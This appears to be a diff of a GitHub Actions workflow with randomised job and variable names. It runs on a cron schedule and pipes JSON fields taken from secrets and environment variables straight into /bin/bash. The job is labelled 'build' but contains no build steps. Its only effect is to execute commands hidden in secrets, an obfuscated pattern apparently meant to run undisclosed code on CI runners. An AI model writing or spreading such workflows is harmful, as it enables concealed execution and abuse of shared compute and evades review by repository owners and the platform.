@@ -1,9 +1,8 @@
 name: luanyunping2345
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 4/6 * * *'
+    - cron: '29 5/6 * * *'
 
 jobs:
   build:
@@ -13,16 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: luanyunping2345
         env:
-          ocsqm8681: ${{ secrets.ocsqm8681 }}
+          in8646: ${{ secrets.in8646 }}
         run: |
-          echo $ocsqm8681 | jq -r .v7825 | /bin/bash
-          echo $ef0 | jq -r .grj3342 | /bin/bash
-          echo $ty06 | jq -r .mdon22856 | /bin/bash
-          echo $hmcj6695 | jq -r .ezted894 | /bin/bash
-          echo $m49077 | jq -r .kf01111 | /bin/bash
-          echo $swtaz26673 | jq -r .rcri5313 | /bin/bash
-          echo $mv9911 | jq -r .zvp3 | /bin/bash
-          echo $g617 | jq -r .y312 | /bin/bash
-          echo $flvw9263 | jq -r .gauc6701 | /bin/bash
-          echo $n755 | jq -r .yoj326 | /bin/bash
+          echo $in8646 | jq -r .dgl12964 | /bin/bash
+          echo $nb854 | jq -r .ovmo86 | /bin/bash
+          echo $yeqx475 | jq -r .fkxot7768 | /bin/bash
+          echo $elv81544 | jq -r .cku93 | /bin/bash
+          echo $h8 | jq -r .wum83351 | /bin/bash
+          echo $gchxb518 | jq -r .ru62 | /bin/bash
+          echo $tt80 | jq -r .piye92970 | /bin/bash
+          echo $does2 | jq -r .z8 | /bin/bash
+          echo $ra28 | jq -r .u67135 | /bin/bash
+          echo $dd6 | jq -r .attab5827 | /bin/bash
+          echo $yc14356 | jq -r .sogw5 | /bin/bash
 
